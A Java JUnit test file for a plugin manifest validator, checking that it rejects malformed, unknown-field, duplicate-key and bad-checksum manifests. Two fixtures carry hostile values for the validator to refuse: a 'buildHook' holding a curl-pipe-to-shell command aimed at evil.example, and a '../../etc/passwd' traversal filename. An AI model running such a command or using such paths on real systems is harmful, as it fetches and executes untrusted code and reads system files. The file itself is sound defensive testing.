package ai.ravenroot.plugin.bundle;

import ai.ravenroot.api.node.NodeSdk;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Rejection-first: every malformed-manifest shape below is shown rejected with the exact {@link
 * PluginBundleException.Reason} it should carry, before {@link #parsesACompleteValidManifest()}
 * shows the same grammar accepted. A validator that has only ever been shown to accept proves
 * nothing.
 */
class PluginManifestTest {

    private static final String HEX64 = "0123456789abcdef".repeat(4);

    @Test
    void rejectsAManifestMissingARequiredField() {
        String json = """
                {
                  "id":"ai.ravenroot.extensions.mail",
                  "version":"1.0.0",
                  "sdkContract":"%s",
                  "nodePackageClasses":["ai.ravenroot.extensions.mail.MailNodePackage"],
                  "behaviors":["mail.send"],
                  "mainArtifact":{"fileName":"ravenroot-mail.jar","sha256":"%s","sizeBytes":10}
                }
                """.formatted(NodeSdk.CONTRACT, HEX64);
        PluginBundleException rejection = assertThrows(PluginBundleException.class, () -> PluginManifest.read(json));
        assertEquals(PluginBundleException.Reason.MISSING_REQUIRED_FIELD, rejection.reason());
        assertEquals("schemaVersion", rejection.diagnosticDetail().get("field"));
    }

    /**
     * The field is optional, and its two "no generative capability" answers are not the
     * same answer: {@code []} declares none, an absent key declares nothing. {@code
     * GenerativeCapabilityScan} clears a shipped bundle on the first and refuses it on the second,
     * so collapsing them into an empty list here would silently exempt every bundle built before the
     * field existed.
     */
    @Test
    void distinguishesAnAbsentCapabilityFieldFromADeclaredEmptyOne() {
        assertTrue(PluginManifest.read(manifestWith(null)).nodeCapabilities().isEmpty());
        assertEquals(java.util.List.of(),
                PluginManifest.read(manifestWith("[]")).nodeCapabilities().orElseThrow());
        assertEquals(java.util.List.of("ai", "outbound-http"),
                PluginManifest.read(manifestWith("[\"ai\",\"outbound-http\"]")).nodeCapabilities().orElseThrow());
    }

    /** Recognised means structurally validated, per this record's closed-field-set rule: a
     * recognised key with the wrong shape is rejected, never accepted-and-ignored. */
    @Test
    void rejectsACapabilityFieldThatIsNotAListOfNonBlankText() {
        PluginBundleException notAList =
                assertThrows(PluginBundleException.class, () -> PluginManifest.read(manifestWith("\"ai\"")));
        assertEquals(PluginBundleException.Reason.MALFORMED_MANIFEST, notAList.reason());

        PluginBundleException blankElement =
                assertThrows(PluginBundleException.class, () -> PluginManifest.read(manifestWith("[\"ai\",\"  \"]")));
        assertEquals(PluginBundleException.Reason.MALFORMED_MANIFEST, blankElement.reason());

        PluginBundleException wrongElementType =
                assertThrows(PluginBundleException.class, () -> PluginManifest.read(manifestWith("[1]")));
        assertEquals(PluginBundleException.Reason.MALFORMED_MANIFEST, wrongElementType.reason());
    }

    private static String manifestWith(String capabilitiesJson) {
        String member = capabilitiesJson == null ? ""
                : "  \"" + PluginManifest.NODE_CAPABILITIES_KEY + "\":" + capabilitiesJson + ",\n";
        return """
                {
                  "schemaVersion":"1",
                  "id":"ai.ravenroot.extensions.mail",
                  "version":"1.0.0",
                  "sdkContract":"%s",
                  "nodePackageClasses":["ai.ravenroot.extensions.mail.MailNodePackage"],
                  "behaviors":["mail.send"],
                %s  "mainArtifact":{"fileName":"ravenroot-mail.jar","sha256":"%s","sizeBytes":10}
                }
                """.formatted(NodeSdk.CONTRACT, member, HEX64);
    }

    @Test
    void rejectsAManifestWithAnUnrecognisedTopLevelField() {
        String json = """
                {
                  "schemaVersion":"1",
                  "id":"ai.ravenroot.extensions.mail",
                  "version":"1.0.0",
                  "sdkContract":"%s",
                  "nodePackageClasses":["ai.ravenroot.extensions.mail.MailNodePackage"],
                  "behaviors":["mail.send"],
                  "mainArtifact":{"fileName":"ravenroot-mail.jar","sha256":"%s","sizeBytes":10},
                  "buildHook":"curl http://evil.example/install.sh | sh"
                }
                """.formatted(NodeSdk.CONTRACT, HEX64);
        PluginBundleException rejection = assertThrows(PluginBundleException.class, () -> PluginManifest.read(json));
        assertEquals(PluginBundleException.Reason.UNKNOWN_FIELD, rejection.reason());
        assertEquals("buildHook", rejection.diagnosticDetail().get("field"));
    }

    @Test
    void rejectsAnUnsupportedSchemaVersion() {
        String json = """
                {
                  "schemaVersion":"999",
                  "id":"ai.ravenroot.extensions.mail",
                  "version":"1.0.0",
                  "sdkContract":"%s",
                  "nodePackageClasses":["ai.ravenroot.extensions.mail.MailNodePackage"],
                  "behaviors":["mail.send"],
                  "mainArtifact":{"fileName":"ravenroot-mail.jar","sha256":"%s","sizeBytes":10}
                }
                """.formatted(NodeSdk.CONTRACT, HEX64);
        PluginBundleException rejection = assertThrows(PluginBundleException.class, () -> PluginManifest.read(json));
        assertEquals(PluginBundleException.Reason.UNSUPPORTED_SCHEMA_VERSION, rejection.reason());
    }

    @Test
    void rejectsAnIncompatibleSdkContract() {
        String json = """
                {
                  "schemaVersion":"1",
                  "id":"ai.ravenroot.extensions.mail",
                  "version":"1.0.0",
                  "sdkContract":"ravenroot.node-sdk/999",
                  "nodePackageClasses":["ai.ravenroot.extensions.mail.MailNodePackage"],
                  "behaviors":["mail.send"],
                  "mainArtifact":{"fileName":"ravenroot-mail.jar","sha256":"%s","sizeBytes":10}
                }
                """.formatted(HEX64);
        PluginBundleException rejection = assertThrows(PluginBundleException.class, () -> PluginManifest.read(json));
        assertEquals(PluginBundleException.Reason.UNSUPPORTED_SDK_CONTRACT, rejection.reason());
    }

    @Test
    void rejectsADuplicateJsonKeyRatherThanLastWinsMerge() {
        // The exact hazard PayloadJson's duplicate-key rejection exists for: a validating front end
        // and an executing back end must never be able to disagree about which "id" a manifest meant.
        String json = """
                {
                  "schemaVersion":"1",
                  "id":"ai.ravenroot.extensions.mail",
                  "id":"something-else",
                  "version":"1.0.0",
                  "sdkContract":"%s",
                  "nodePackageClasses":["ai.ravenroot.extensions.mail.MailNodePackage"],
                  "behaviors":["mail.send"],
                  "mainArtifact":{"fileName":"ravenroot-mail.jar","sha256":"%s","sizeBytes":10}
                }
                """.formatted(NodeSdk.CONTRACT, HEX64);
        PluginBundleException rejection = assertThrows(PluginBundleException.class, () -> PluginManifest.read(json));
        assertEquals(PluginBundleException.Reason.MALFORMED_MANIFEST, rejection.reason());
        assertEquals("json", rejection.diagnosticDetail().get("field"));
        assertTrue(rejection.diagnosticDetail().get("observed").contains("DUPLICATE_KEY"));
    }

    /**
     * Every one of these eight shapes once came back {@code reason=MALFORMED_MANIFEST, detail={}} --
     * a call-site defect ({@code malformedManifest(key, null)}, whose factory dropped {@code key}
     * along with the {@code null} value) that discarded the entire diagnosis at each site. Driving
     * every shape through {@link PluginManifest#read} and asserting the detail map is non-empty and
     * names the actual field is what would have caught it: a test that only checks
     * {@code reason() == MALFORMED_MANIFEST}, as several tests elsewhere in this class still correctly
     * do for other purposes, cannot distinguish "sanitized and actionable" from "sanitized and empty".
     */
    @Test
    void rootNotAnObjectReportsTheFieldAndWhatWasFound() {
        PluginBundleException rejection = assertThrows(PluginBundleException.class,
                () -> PluginManifest.read("[]"));
        assertEquals(PluginBundleException.Reason.MALFORMED_MANIFEST, rejection.reason());
        assertEquals("root", rejection.diagnosticDetail().get("field"));
        assertTrue(rejection.diagnosticDetail().get("observed").contains("a list"));
    }

    @Test
    void idWrongTypeReportsTheField() {
        PluginBundleException rejection = assertThrows(PluginBundleException.class, () -> PluginManifest.read("""
                {
                  "schemaVersion":"1",
                  "id":123,
                  "version":"1.0.0",
                  "sdkContract":"%s",
                  "nodePackageClasses":["a.B"],
                  "behaviors":["x"],
                  "mainArtifact":{"fileName":"a.jar","sha256":"%s","sizeBytes":10}
                }
                """.formatted(NodeSdk.CONTRACT, HEX64)));
        assertEquals(PluginBundleException.Reason.MALFORMED_MANIFEST, rejection.reason());
        assertEquals("id", rejection.diagnosticDetail().get("field"));
        assertTrue(rejection.diagnosticDetail().get("observed").contains("integer"));
    }

    @Test
    void idBlankReportsTheField() {
        PluginBundleException rejection = assertThrows(PluginBundleException.class, () -> PluginManifest.read("""
                {
                  "schemaVersion":"1",
                  "id":"   ",
                  "version":"1.0.0",
                  "sdkContract":"%s",
                  "nodePackageClasses":["a.B"],
                  "behaviors":["x"],
                  "mainArtifact":{"fileName":"a.jar","sha256":"%s","sizeBytes":10}
                }
                """.formatted(NodeSdk.CONTRACT, HEX64)));
        assertEquals(PluginBundleException.Reason.MALFORMED_MANIFEST, rejection.reason());
        assertEquals("id", rejection.diagnosticDetail().get("field"));
        assertTrue(rejection.diagnosticDetail().get("observed").contains("blank"));
    }

    @Test
    void nodePackageClassesNotAListReportsTheField() {
        PluginBundleException rejection = assertThrows(PluginBundleException.class, () -> PluginManifest.read("""
                {
                  "schemaVersion":"1",
                  "id":"a.b",
                  "version":"1.0.0",
                  "sdkContract":"%s",
                  "nodePackageClasses":"not-a-list",
                  "behaviors":["x"],
                  "mainArtifact":{"fileName":"a.jar","sha256":"%s","sizeBytes":10}
                }
                """.formatted(NodeSdk.CONTRACT, HEX64)));
        assertEquals(PluginBundleException.Reason.MALFORMED_MANIFEST, rejection.reason());
        assertEquals("nodePackageClasses", rejection.diagnosticDetail().get("field"));
        assertTrue(rejection.diagnosticDetail().get("observed").contains("text"));
    }

    @Test
    void nodePackageClassesElementWrongTypeReportsTheField() {
        PluginBundleException rejection = assertThrows(PluginBundleException.class, () -> PluginManifest.read("""
                {
                  "schemaVersion":"1",
                  "id":"a.b",
                  "version":"1.0.0",
                  "sdkContract":"%s",
                  "nodePackageClasses":[123],
                  "behaviors":["x"],
                  "mainArtifact":{"fileName":"a.jar","sha256":"%s","sizeBytes":10}
                }
                """.formatted(NodeSdk.CONTRACT, HEX64)));
        assertEquals(PluginBundleException.Reason.MALFORMED_MANIFEST, rejection.reason());
        assertEquals("nodePackageClasses", rejection.diagnosticDetail().get("field"));
        assertTrue(rejection.diagnosticDetail().get("observed").contains("element 0"));
    }

    @Test
    void mainArtifactNotAMapReportsTheField() {
        PluginBundleException rejection = assertThrows(PluginBundleException.class, () -> PluginManifest.read("""
                {
                  "schemaVersion":"1",
                  "id":"a.b",
                  "version":"1.0.0",
                  "sdkContract":"%s",
                  "nodePackageClasses":["a.B"],
                  "behaviors":["x"],
                  "mainArtifact":"not-a-map"
                }
                """.formatted(NodeSdk.CONTRACT)));
        assertEquals(PluginBundleException.Reason.MALFORMED_MANIFEST, rejection.reason());
        assertEquals("mainArtifact", rejection.diagnosticDetail().get("field"));
        assertTrue(rejection.diagnosticDetail().get("observed").contains("text"));
    }

    @Test
    void dependencyArtifactsNotAListReportsTheField() {
        PluginBundleException rejection = assertThrows(PluginBundleException.class, () -> PluginManifest.read("""
                {
                  "schemaVersion":"1",
                  "id":"a.b",
                  "version":"1.0.0",
                  "sdkContract":"%s",
                  "nodePackageClasses":["a.B"],
                  "behaviors":["x"],
                  "mainArtifact":{"fileName":"a.jar","sha256":"%s","sizeBytes":10},
                  "dependencyArtifacts":"not-a-list"
                }
                """.formatted(NodeSdk.CONTRACT, HEX64)));
        assertEquals(PluginBundleException.Reason.MALFORMED_MANIFEST, rejection.reason());
        assertEquals("dependencyArtifacts", rejection.diagnosticDetail().get("field"));
        assertTrue(rejection.diagnosticDetail().get("observed").contains("text"));
    }

    @Test
    void dependencyArtifactsElementNotAMapReportsTheField() {
        PluginBundleException rejection = assertThrows(PluginBundleException.class, () -> PluginManifest.read("""
                {
                  "schemaVersion":"1",
                  "id":"a.b",
                  "version":"1.0.0",
                  "sdkContract":"%s",
                  "nodePackageClasses":["a.B"],
                  "behaviors":["x"],
                  "mainArtifact":{"fileName":"a.jar","sha256":"%s","sizeBytes":10},
                  "dependencyArtifacts":["not-a-map"]
                }
                """.formatted(NodeSdk.CONTRACT, HEX64)));
        assertEquals(PluginBundleException.Reason.MALFORMED_MANIFEST, rejection.reason());
        assertEquals("dependencyArtifacts", rejection.diagnosticDetail().get("field"));
        assertTrue(rejection.diagnosticDetail().get("observed").contains("element 0"));
    }

    @Test
    void rejectsAnArtifactNameThatIsNotABareFilename() {
        String json = """
                {
                  "schemaVersion":"1",
                  "id":"ai.ravenroot.extensions.mail",
                  "version":"1.0.0",
                  "sdkContract":"%s",
                  "nodePackageClasses":["ai.ravenroot.extensions.mail.MailNodePackage"],
                  "behaviors":["mail.send"],
                  "mainArtifact":{"fileName":"../../etc/passwd","sha256":"%s","sizeBytes":10}
                }
                """.formatted(NodeSdk.CONTRACT, HEX64);
        PluginBundleException rejection = assertThrows(PluginBundleException.class, () -> PluginManifest.read(json));
        assertEquals(PluginBundleException.Reason.INVALID_ARTIFACT_NAME, rejection.reason());
    }

    @Test
    void rejectsAMalformedChecksum() {
        String json = """
                {
                  "schemaVersion":"1",
                  "id":"ai.ravenroot.extensions.mail",
                  "version":"1.0.0",
                  "sdkContract":"%s",
                  "nodePackageClasses":["ai.ravenroot.extensions.mail.MailNodePackage"],
                  "behaviors":["mail.send"],
                  "mainArtifact":{"fileName":"ravenroot-mail.jar","sha256":"not-a-checksum","sizeBytes":10}
                }
                """.formatted(NodeSdk.CONTRACT);
        PluginBundleException rejection = assertThrows(PluginBundleException.class, () -> PluginManifest.read(json));
        assertEquals(PluginBundleException.Reason.MALFORMED_MANIFEST, rejection.reason());
        assertEquals("sha256", rejection.diagnosticDetail().get("field"));
        assertFalse(rejection.diagnosticDetail().isEmpty());
    }

    @Test
    void rejectsDuplicateArtifactFilenamesAcrossMainAndDependencies() {
        String json = """
                {
                  "schemaVersion":"1",
                  "id":"ai.ravenroot.extensions.mail",
                  "version":"1.0.0",
                  "sdkContract":"%s",
                  "nodePackageClasses":["ai.ravenroot.extensions.mail.MailNodePackage"],
                  "behaviors":["mail.send"],
                  "mainArtifact":{"fileName":"ravenroot-mail.jar","sha256":"%s","sizeBytes":10},
                  "dependencyArtifacts":[{"fileName":"ravenroot-mail.jar","sha256":"%s","sizeBytes":20}]
                }
                """.formatted(NodeSdk.CONTRACT, HEX64, HEX64);
        PluginBundleException rejection = assertThrows(PluginBundleException.class, () -> PluginManifest.read(json));
        assertEquals(PluginBundleException.Reason.DUPLICATE_ARTIFACT_NAME, rejection.reason());
    }

    /**
     * Each of these is a recognised optional field name but has no structural validator yet. A
     * manifest carrying any of them today must be
     * refused exactly as if the key were unknown to the schema — never silently accepted and carried
     * through unchecked, since two of these ({@code provenance}, {@code signature}) exist precisely
     * so a future consumer can draw a trust conclusion from them.
     */
    @org.junit.jupiter.params.ParameterizedTest
    @org.junit.jupiter.params.provider.ValueSource(strings = {
            "description", "license", "ravenrootVersionRange", "operatorConfig", "provenance", "signature"})
    void rejectsUnvalidatedOptionalFieldsRatherThanAcceptingThemUnchecked(String fieldName) {
        String json = """
                {
                  "schemaVersion":"1",
                  "id":"ai.ravenroot.extensions.mail",
                  "version":"1.0.0",
                  "sdkContract":"%s",
                  "nodePackageClasses":["ai.ravenroot.extensions.mail.MailNodePackage"],
                  "behaviors":["mail.send"],
                  "mainArtifact":{"fileName":"ravenroot-mail.jar","sha256":"%s","sizeBytes":10},
                  "%s":"anything at all, including something malicious"
                }
                """.formatted(NodeSdk.CONTRACT, HEX64, fieldName);
        PluginBundleException rejection = assertThrows(PluginBundleException.class, () -> PluginManifest.read(json));
        assertEquals(PluginBundleException.Reason.UNKNOWN_FIELD, rejection.reason());
        assertEquals(fieldName, rejection.diagnosticDetail().get("field"));
    }

    @Test
    void parsesACompleteValidManifest() {
        String json = """
                {
                  "schemaVersion":"1",
                  "id":"ai.ravenroot.extensions.mail",
                  "version":"1.0.0",
                  "sdkContract":"%s",
                  "nodePackageClasses":["ai.ravenroot.extensions.mail.MailNodePackage"],
                  "behaviors":["mail.send","mail.imap.query"],
                  "mainArtifact":{"fileName":"ravenroot-mail.jar","sha256":"%s","sizeBytes":10},
                  "dependencyArtifacts":[{"fileName":"angus-mail.jar","sha256":"%s","sizeBytes":20}]
                }
                """.formatted(NodeSdk.CONTRACT, HEX64, HEX64);

        PluginManifest manifest = PluginManifest.read(json);

        assertEquals("1", manifest.schemaVersion());
        assertEquals("ai.ravenroot.extensions.mail", manifest.id());
        assertEquals(NodeSdk.CONTRACT, manifest.sdkContract());
        assertEquals(1, manifest.nodePackageClasses().size());
        assertEquals(2, manifest.behaviors().size());
        assertEquals("ravenroot-mail.jar", manifest.mainArtifact().fileName());
        assertEquals(1, manifest.dependencyArtifacts().size());
        assertEquals("angus-mail.jar", manifest.dependencyArtifacts().get(0).fileName());
    }
}
